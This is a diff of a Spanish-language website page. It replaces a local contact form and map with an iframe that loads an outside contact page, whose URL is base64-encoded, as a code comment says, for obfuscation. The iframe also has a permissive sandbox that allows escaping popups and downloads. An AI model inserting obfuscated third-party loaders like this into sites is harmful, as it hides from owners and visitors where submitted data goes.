@@ -328,146 +328,39 @@ body {
 
 
 
+<section>
 
 
 
+<iframe 
+  id="secureFrame"
+  width="100%" 
+  height="400px"
+  sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-downloads">
+</iframe>
 
+<script>
+const iframe = document.getElementById("secureFrame");
 
+// URL codificada en base64 para mayor “ofuscación”
+const realURL = atob("aHR0cHM6Ly9ub3ZpZS5pbi81L2NvbnRhY3RvLmh0bWw=");
 
-<section class="section" id="contacto">
- 
+// Cargar la URL en el iframe
+iframe.src = realURL;
 
-  <div class="grid" style="gap:50px;">
-    <!-- Formulario -->
-    <div style="max-width:600px; margin:auto;">
-      <h2>Envíanos un mensaje</h2>
-      <p>Rellena el formulario y nos pondremos en contacto contigo.</p>
+// Opcional: escuchar cuando cargue el iframe
+iframe.addEventListener("load", () => {
+  console.log("Iframe cargado en:", realURL);
 
-      <form id="contactForm" action="procesarFormulario.php" method="POST" style="display:flex; flex-direction:column; gap:15px;">
-        <label for="nombre">* Nombre completo:</label>
-        <input type="text" id="nombre" name="nombre" placeholder="Ej. Ana Martínez" required>
+  // Aquí podrías enviar datos al iframe si lo necesitas
+  // Ejemplo:
+  // const data = { saludo: "Hola iframe!" };
+  // iframe.contentWindow.postMessage(data, "https://novie.in");
+});
+</script>
 
-        <label for="correo">* Correo electrónico:</label>
-        <input type="email" id="correo" name="correo" placeholder="Ej. ana@email.com" required>
-
-        <label for="telefono">Teléfono de contacto:</label>
-        <input type="tel" id="telefono" name="telefono" placeholder="Ej. 555-123-4567">
-
-        <label for="asunto">* Asunto:</label>
-        <select id="asunto" name="asunto" required>
-          <option value="" disabled selected>Selecciona una opción</option>
-          <option value="quejas">Quejas y sugerencias</option>
-          <option value="rh">Recursos Humanos</option>
-          <option value="facturacion">Facturacion</option>
-          <option value="otro">Otro</option>
-        </select>
-
-        <label for="mensaje">* Mensaje:</label>
-        <textarea id="mensaje" name="mensaje" rows="5" placeholder="Escribe tu mensaje aquí..." required></textarea>
-
-        <button type="submit" style="background:var(--vino); color:#fff; font-weight:bold; padding:12px 20px; border:none; border-radius:5px; cursor:pointer;">Enviar mensaje</button>
-      </form>
-
-      <!-- Popup Modal -->
-      <div id="popup" style="display:none; position:fixed; z-index:10000; left:0; top:0; width:100%; height:100%; background:rgba(0,0,0,0.7);">
-        <div style="background:#fff; margin:15% auto; padding:20px; border-radius:10px; max-width:400px; text-align:center; position:relative; font-family:'Inter',sans-serif;">
-          <span onclick="cerrarPopup()" style="position:absolute; right:15px; top:10px; cursor:pointer; font-size:20px;">❌</span>
-          <p id="popupMensaje"></p>
-        </div>
-      </div>
-
-      <script>
-        document.getElementById('contactForm').addEventListener('submit', function(event){
-          event.preventDefault();
-
-          const nombre = document.getElementById('nombre').value.trim();
-          const correo = document.getElementById('correo').value.trim();
-          const asunto = document.getElementById('asunto').value;
-          const mensaje = document.getElementById('mensaje').value.trim();
-
-          if(!nombre || !correo || !asunto || !mensaje){
-            mostrarPopup("Por favor completa todos los campos obligatorios.");
-            return;
-          }
-
-          const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-          if(!emailPattern.test(correo)){
-            mostrarPopup("Por favor ingresa un correo válido.");
-            return;
-          }
-
-          const formData = new FormData(this);
-          const xhr = new XMLHttpRequest();
-          xhr.open("POST", this.action, true);
-
-          xhr.onload = function(){
-            if(xhr.status === 200){
-              mostrarPopup(`¡Gracias, ${nombre}! Tu mensaje ha sido enviado correctamente.`);
-              document.getElementById('contactForm').reset();
-            } else {
-              mostrarPopup("Hubo un error al enviar tu mensaje. Intenta nuevamente.");
-            }
-          };
-
-          xhr.send(formData);
-        });
-
-        function mostrarPopup(mensaje){
-          document.getElementById('popupMensaje').innerText = mensaje;
-          document.getElementById('popup').style.display = 'block';
-        }
-
-        function cerrarPopup(){
-          document.getElementById('popup').style.display = 'none';
-        }
-      </script>
-    </div>
-
-    <!-- Mapa -->
-    <div style="max-width:600px; margin:auto;">
-      <h2>Ubicación</h2>
-      <p><strong>Dirección:</strong><br>Dr. Jimenez 262, Doctores, Cuauhtémoc, 06720 Ciudad de México, CDMX</p>
-      <p><strong>Horarios de atención:</strong><br>Lunes a viernes de 08:00 a 18:00</p>
-      <iframe src="https://maps.google.com/maps?q=dr%20jimenez%20262%20cuauhtemoc%20cdmx&amp;t=&amp;z=17&amp;ie=UTF8&amp;iwloc=&amp;output=embed" frameborder="0" style="width:100%; height:400px;"></iframe>
-    </div>
-  </div>
+  
 </section>
-
-<style>
-  #contacto h1, #contacto h2 {
-    font-family:'Playfair Display', serif;
-    color:var(--vino);
-  }
-
-  #contacto p {
-    font-family:'Inter', sans-serif;
-    line-height:1.6;
-  }
-
-  #contacto input, #contacto select, #contacto textarea {
-    font-family:'Inter', sans-serif;
-    border:1px solid #ccc;
-    border-radius:5px;
-    padding:10px;
-    width:100%;
-  }
-
-  #contacto button:hover {
-    background:#550a12;
-  }
-
-  @media(max-width:900px){
-    .grid {
-      display:flex;
-      flex-direction:column;
-      gap:40px;
-    }
-  }
-</style>
-
-
-
-
 
 
 
@@ -511,3 +404,4 @@ btn.addEventListener('click', () => {
 
 </body>
 </html>
+
